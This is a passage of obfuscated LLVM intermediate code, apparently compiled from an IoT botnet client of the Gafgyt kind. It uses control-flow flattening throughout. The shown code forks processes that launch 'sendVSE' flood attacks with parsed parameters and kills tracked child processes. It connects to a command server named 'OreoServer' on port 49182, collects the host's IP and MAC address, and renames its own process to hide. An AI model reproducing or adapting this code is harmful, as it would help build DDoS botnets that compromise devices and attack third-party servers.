  %632 = getelementptr inbounds i8*, i8** %631, i64 2
  %633 = load i8*, i8** %632, align 8
  %634 = call i32 @atoi(i8* %633) #10
  %635 = icmp eq i32 %634, -1
  %636 = select i1 %635, i32 1146977151, i32 555741715
  store i32 %636, i32* %switchVar
  br label %loopEnd

; <label>:637:                                    ; preds = %loopEntry
  %638 = load i8**, i8*** %4, align 8
  %639 = getelementptr inbounds i8*, i8** %638, i64 4
  %640 = load i8*, i8** %639, align 8
  %641 = call i32 @atoi(i8* %640) #10
  %642 = icmp eq i32 %641, -1
  %643 = select i1 %642, i32 1146977151, i32 27554769
  store i32 %643, i32* %switchVar
  br label %loopEnd

; <label>:644:                                    ; preds = %loopEntry
  %645 = load i8**, i8*** %4, align 8
  %646 = getelementptr inbounds i8*, i8** %645, i64 5
  %647 = load i8*, i8** %646, align 8
  %648 = call i32 @atoi(i8* %647) #10
  %649 = icmp eq i32 %648, -1
  %650 = select i1 %649, i32 1146977151, i32 1855248383
  store i32 %650, i32* %switchVar
  br label %loopEnd

; <label>:651:                                    ; preds = %loopEntry
  %652 = load i8**, i8*** %4, align 8
  %653 = getelementptr inbounds i8*, i8** %652, i64 5
  %654 = load i8*, i8** %653, align 8
  %655 = call i32 @atoi(i8* %654) #10
  %656 = icmp sgt i32 %655, 65536
  %657 = select i1 %656, i32 1146977151, i32 -1415623289
  store i32 %657, i32* %switchVar
  br label %loopEnd

; <label>:658:                                    ; preds = %loopEntry
  %659 = load i8**, i8*** %4, align 8
  %660 = getelementptr inbounds i8*, i8** %659, i64 5
  %661 = load i8*, i8** %660, align 8
  %662 = call i32 @atoi(i8* %661) #10
  %663 = icmp sgt i32 %662, 65500
  %664 = select i1 %663, i32 1146977151, i32 1797613126
  store i32 %664, i32* %switchVar
  br label %loopEnd

; <label>:665:                                    ; preds = %loopEntry
  %666 = load i8**, i8*** %4, align 8
  %667 = getelementptr inbounds i8*, i8** %666, i64 4
  %668 = load i8*, i8** %667, align 8
  %669 = call i32 @atoi(i8* %668) #10
  %670 = icmp sgt i32 %669, 32
  %671 = select i1 %670, i32 1146977151, i32 -1334502466
  store i32 %671, i32* %switchVar
  br label %loopEnd

; <label>:672:                                    ; preds = %loopEntry
  %673 = load i32, i32* %3, align 4
  %674 = icmp eq i32 %673, 7
  %675 = select i1 %674, i32 -1305123915, i32 -1116965879
  store i32 %675, i32* %switchVar
  br label %loopEnd

; <label>:676:                                    ; preds = %loopEntry
  %677 = load i8**, i8*** %4, align 8
  %678 = getelementptr inbounds i8*, i8** %677, i64 6
  %679 = load i8*, i8** %678, align 8
  %680 = call i32 @atoi(i8* %679) #10
  %681 = icmp slt i32 %680, 1
  %682 = select i1 %681, i32 1146977151, i32 -1116965879
  store i32 %682, i32* %switchVar
  br label %loopEnd

; <label>:683:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  %685 = load i8**, i8*** %4, align 8
  %686 = getelementptr inbounds i8*, i8** %685, i64 1
  %687 = load i8*, i8** %686, align 8
  store i8* %687, i8** %37, align 8
  %688 = load i8**, i8*** %4, align 8
  %689 = getelementptr inbounds i8*, i8** %688, i64 2
  %690 = load i8*, i8** %689, align 8
  %691 = call i32 @atoi(i8* %690) #10
  store i32 %691, i32* %38, align 4
  %692 = load i8**, i8*** %4, align 8
  %693 = getelementptr inbounds i8*, i8** %692, i64 3
  %694 = load i8*, i8** %693, align 8
  %695 = call i32 @atoi(i8* %694) #10
  store i32 %695, i32* %39, align 4
  %696 = load i8**, i8*** %4, align 8
  %697 = getelementptr inbounds i8*, i8** %696, i64 4
  %698 = load i8*, i8** %697, align 8
  %699 = call i32 @atoi(i8* %698) #10
  store i32 %699, i32* %40, align 4
  %700 = load i8**, i8*** %4, align 8
  %701 = getelementptr inbounds i8*, i8** %700, i64 5
  %702 = load i8*, i8** %701, align 8
  %703 = call i32 @atoi(i8* %702) #10
  store i32 %703, i32* %41, align 4
  %704 = load i32, i32* %3, align 4
  %705 = icmp sgt i32 %704, 6
  %706 = select i1 %705, i32 -658725038, i32 19654745
  store i32 %706, i32* %switchVar
  br label %loopEnd

; <label>:707:                                    ; preds = %loopEntry
  %708 = load i8**, i8*** %4, align 8
  %709 = getelementptr inbounds i8*, i8** %708, i64 6
  %710 = load i8*, i8** %709, align 8
  %711 = call i32 @atoi(i8* %710) #10
  store i32 483659014, i32* %switchVar
  store i32 %711, i32* %.reg2mem16
  br label %loopEnd

; <label>:712:                                    ; preds = %loopEntry
  store i32 483659014, i32* %switchVar
  store i32 1000, i32* %.reg2mem16
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %.reload17 = load i32, i32* %.reg2mem16
  store i32 %.reload17, i32* %42, align 4
  %714 = load i32, i32* %3, align 4
  %715 = icmp sgt i32 %714, 7
  %716 = select i1 %715, i32 -657855670, i32 -1047362025
  store i32 %716, i32* %switchVar
  br label %loopEnd

; <label>:717:                                    ; preds = %loopEntry
  %718 = load i8**, i8*** %4, align 8
  %719 = getelementptr inbounds i8*, i8** %718, i64 7
  %720 = load i8*, i8** %719, align 8
  %721 = call i32 @atoi(i8* %720) #10
  store i32 1934172510, i32* %switchVar
  store i32 %721, i32* %.reg2mem18
  br label %loopEnd

; <label>:722:                                    ; preds = %loopEntry
  store i32 1934172510, i32* %switchVar
  store i32 1000000, i32* %.reg2mem18
  br label %loopEnd

; <label>:723:                                    ; preds = %loopEntry
  %.reload19 = load i32, i32* %.reg2mem18
  store i32 %.reload19, i32* %43, align 4
  %724 = load i32, i32* %3, align 4
  %725 = icmp sgt i32 %724, 8
  %726 = select i1 %725, i32 -807820648, i32 -1904328185
  store i32 %726, i32* %switchVar
  br label %loopEnd

; <label>:727:                                    ; preds = %loopEntry
  %728 = load i8**, i8*** %4, align 8
  %729 = getelementptr inbounds i8*, i8** %728, i64 8
  %730 = load i8*, i8** %729, align 8
  %731 = call i32 @atoi(i8* %730) #10
  store i32 -1435003002, i32* %switchVar
  store i32 %731, i32* %.reg2mem20
  br label %loopEnd

; <label>:732:                                    ; preds = %loopEntry
  store i32 -1435003002, i32* %switchVar
  store i32 0, i32* %.reg2mem20
  br label %loopEnd

; <label>:733:                                    ; preds = %loopEntry
  %.reload21 = load i32, i32* %.reg2mem20
  store i32 %.reload21, i32* %44, align 4
  %734 = load i8*, i8** %37, align 8
  %735 = call i8* @strstr(i8* %734, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %736 = icmp ne i8* %735, null
  %737 = select i1 %736, i32 639431963, i32 -584547570
  store i32 %737, i32* %switchVar
  br label %loopEnd

; <label>:738:                                    ; preds = %loopEntry
  %739 = load i8*, i8** %37, align 8
  %740 = call i8* @strtok(i8* %739, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %740, i8** %45, align 8
  store i32 -894396255, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  %742 = load i8*, i8** %45, align 8
  %743 = icmp ne i8* %742, null
  %744 = select i1 %743, i32 -323436234, i32 1494292031
  store i32 %744, i32* %switchVar
  br label %loopEnd

; <label>:745:                                    ; preds = %loopEntry
  %746 = call i32 @listFork()
  %747 = icmp ne i32 %746, 0
  %748 = select i1 %747, i32 -561247514, i32 -2078299148
  store i32 %748, i32* %switchVar
  br label %loopEnd

; <label>:749:                                    ; preds = %loopEntry
  %750 = load i8*, i8** %45, align 8
  %751 = load i32, i32* %38, align 4
  %752 = load i32, i32* %39, align 4
  %753 = load i32, i32* %40, align 4
  %754 = load i32, i32* %41, align 4
  %755 = load i32, i32* %42, align 4
  %756 = load i32, i32* %43, align 4
  %757 = load i32, i32* %44, align 4
  call void @sendVSE(i8* %750, i32 %751, i32 %752, i32 %753, i32 %754, i32 %755, i32 %756, i32 %757)
  call void @_exit(i32 0) #12
  unreachable

; <label>:758:                                    ; preds = %loopEntry
  %759 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %759, i8** %45, align 8
  store i32 -894396255, i32* %switchVar
  br label %loopEnd

; <label>:760:                                    ; preds = %loopEntry
  store i32 -88790507, i32* %switchVar
  br label %loopEnd

; <label>:761:                                    ; preds = %loopEntry
  %762 = call i32 @listFork()
  %763 = icmp ne i32 %762, 0
  %764 = select i1 %763, i32 1283033344, i32 -103130374
  store i32 %764, i32* %switchVar
  br label %loopEnd

; <label>:765:                                    ; preds = %loopEntry
  %766 = load i8*, i8** %37, align 8
  %767 = load i32, i32* %38, align 4
  %768 = load i32, i32* %39, align 4
  %769 = load i32, i32* %40, align 4
  %770 = load i32, i32* %41, align 4
  %771 = load i32, i32* %42, align 4
  %772 = load i32, i32* %43, align 4
  %773 = load i32, i32* %44, align 4
  call void @sendVSE(i8* %766, i32 %767, i32 %768, i32 %769, i32 %770, i32 %771, i32 %772, i32 %773)
  call void @_exit(i32 0) #12
  unreachable

; <label>:774:                                    ; preds = %loopEntry
  store i32 -88790507, i32* %switchVar
  br label %loopEnd

; <label>:775:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:776:                                    ; preds = %loopEntry
  %777 = load i8**, i8*** %4, align 8
  %778 = getelementptr inbounds i8*, i8** %777, i64 0
  %779 = load i8*, i8** %778, align 8
  %780 = call i32 @strcmp(i8* %779, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.108, i32 0, i32 0)) #10
  %781 = icmp ne i32 %780, 0
  %782 = select i1 %781, i32 1380498670, i32 1835335337
  store i32 %782, i32* %switchVar
  br label %loopEnd

; <label>:783:                                    ; preds = %loopEntry
  store i32 0, i32* %46, align 4
  store i64 0, i64* %47, align 8
  store i32 349999481, i32* %switchVar
  br label %loopEnd

; <label>:784:                                    ; preds = %loopEntry
  %785 = load i64, i64* %47, align 8
  %786 = load i64, i64* @numpids, align 8
  %787 = icmp ult i64 %785, %786
  %788 = select i1 %787, i32 -807992448, i32 -1477657711
  store i32 %788, i32* %switchVar
  br label %loopEnd

; <label>:789:                                    ; preds = %loopEntry
  %790 = load i32*, i32** @pids, align 8
  %791 = load i64, i64* %47, align 8
  %792 = getelementptr inbounds i32, i32* %790, i64 %791
  %793 = load i32, i32* %792, align 4
  %794 = icmp ne i32 %793, 0
  %795 = select i1 %794, i32 1294608787, i32 -937762531
  store i32 %795, i32* %switchVar
  br label %loopEnd

; <label>:796:                                    ; preds = %loopEntry
  %797 = load i32*, i32** @pids, align 8
  %798 = load i64, i64* %47, align 8
  %799 = getelementptr inbounds i32, i32* %797, i64 %798
  %800 = load i32, i32* %799, align 4
  %801 = call i32 @getpid() #2
  %802 = icmp ne i32 %800, %801
  %803 = select i1 %802, i32 -270408292, i32 -937762531
  store i32 %803, i32* %switchVar
  br label %loopEnd

; <label>:804:                                    ; preds = %loopEntry
  %805 = load i32*, i32** @pids, align 8
  %806 = load i64, i64* %47, align 8
  %807 = getelementptr inbounds i32, i32* %805, i64 %806
  %808 = load i32, i32* %807, align 4
  %809 = call i32 @kill(i32 %808, i32 9) #2
  %810 = load i32, i32* %46, align 4
  %811 = add nsw i32 %810, 1
  store i32 %811, i32* %46, align 4
  store i32 -937762531, i32* %switchVar
  br label %loopEnd

; <label>:812:                                    ; preds = %loopEntry
  store i32 -1150079101, i32* %switchVar
  br label %loopEnd

; <label>:813:                                    ; preds = %loopEntry
  %814 = load i64, i64* %47, align 8
  %815 = add i64 %814, 1
  store i64 %815, i64* %47, align 8
  store i32 349999481, i32* %switchVar
  br label %loopEnd

; <label>:816:                                    ; preds = %loopEntry
  %817 = load i32, i32* %46, align 4
  %818 = icmp sgt i32 %817, 0
  %819 = select i1 %818, i32 1430857549, i32 1353690219
  store i32 %819, i32* %switchVar
  br label %loopEnd

; <label>:820:                                    ; preds = %loopEntry
  store i32 258603237, i32* %switchVar
  br label %loopEnd

; <label>:821:                                    ; preds = %loopEntry
  store i32 258603237, i32* %switchVar
  br label %loopEnd

; <label>:822:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:823:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %822, %821, %820, %816, %813, %812, %804, %796, %789, %784, %783, %776, %775, %774, %761, %760, %758, %745, %741, %738, %733, %732, %727, %723, %722, %717, %713, %712, %707, %684, %683, %676, %672, %665, %658, %651, %644, %637, %630, %623, %619, %612, %611, %603, %599, %598, %596, %585, %581, %578, %573, %572, %567, %563, %562, %557, %538, %537, %533, %526, %525, %521, %520, %515, %511, %508, %492, %491, %484, %477, %473, %466, %442, %438, %437, %430, %423, %419, %412, %411, %407, %406, %401, %397, %394, %378, %377, %370, %363, %359, %352, %351, %350, %338, %337, %335, %323, %319, %316, %311, %310, %305, %301, %300, %295, %273, %272, %265, %261, %254, %250, %243, %236, %229, %222, %218, %211, %210, %209, %196, %195, %193, %180, %176, %173, %168, %167, %162, %158, %157, %152, %148, %147, %142, %119, %118, %111, %107, %100, %93, %86, %79, %72, %65, %58, %54, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -814945701, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -814945701, label %first
    i32 -1795558646, label %8
    i32 1304944237, label %11
    i32 -307513030, label %17
    i32 1911678571, label %18
    i32 -2005380755, label %21
    i32 2055667253, label %32
    i32 901279919, label %39
    i32 -2135276229, label %47
    i32 -1413059253, label %48
    i32 1120028386, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 -1795558646, i32 1304944237
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 1304944237, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 -307513030, i32 1911678571
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 -2005380755, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 -2005380755, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @OreoServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #2
  store i32 49182, i32* %3, align 4
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 2055667253, i32 901279919
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #10
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  store i8 0, i8* %38, align 1
  store i32 901279919, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -1413059253, i32 -2135276229
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 1120028386, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1120028386, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1359251439, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1359251439, label %first
    i32 -1606824044, label %16
    i32 -40705336, label %17
    i32 -2064072533, label %31
    i32 1886464218, label %32
    i32 177029387, label %39
    i32 391317485, label %40
    i32 -907761137, label %45
    i32 -98898793, label %51
    i32 1772781875, label %56
    i32 566784455, label %58
    i32 -1909565543, label %64
    i32 1350147936, label %67
    i32 -971884444, label %69
    i32 -956772486, label %71
    i32 -205546472, label %78
    i32 -1843618451, label %86
    i32 -61389643, label %90
    i32 161885734, label %102
    i32 -1752262116, label %105
    i32 -699882515, label %106
    i32 -1238671093, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -1606824044, i32 -40705336
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1238671093, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0)) #2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 -2064072533, i32 1886464218
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1238671093, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #2
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 177029387, i32 391317485
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1238671093, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.110, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 -907761137, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 -98898793, i32 -956772486
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 1772781875, i32 -971884444
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 566784455, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 -1909565543, i32 1350147936
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 566784455, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 -956772486, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 -907761137, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 -205546472, i32 -699882515
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.5* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #2
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  store i32 -1843618451, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 -61389643, i32 -1752262116
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.6* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 161885734, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 -1843618451, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -699882515, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -1238671093, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #10
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i64 %29) #2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %37 = call i32 @getpid() #2
  %38 = xor i32 %36, %37
  call void @srand(i32 %38) #2
  %39 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %40 = call i32 @getpid() #2
  %41 = xor i32 %39, %40
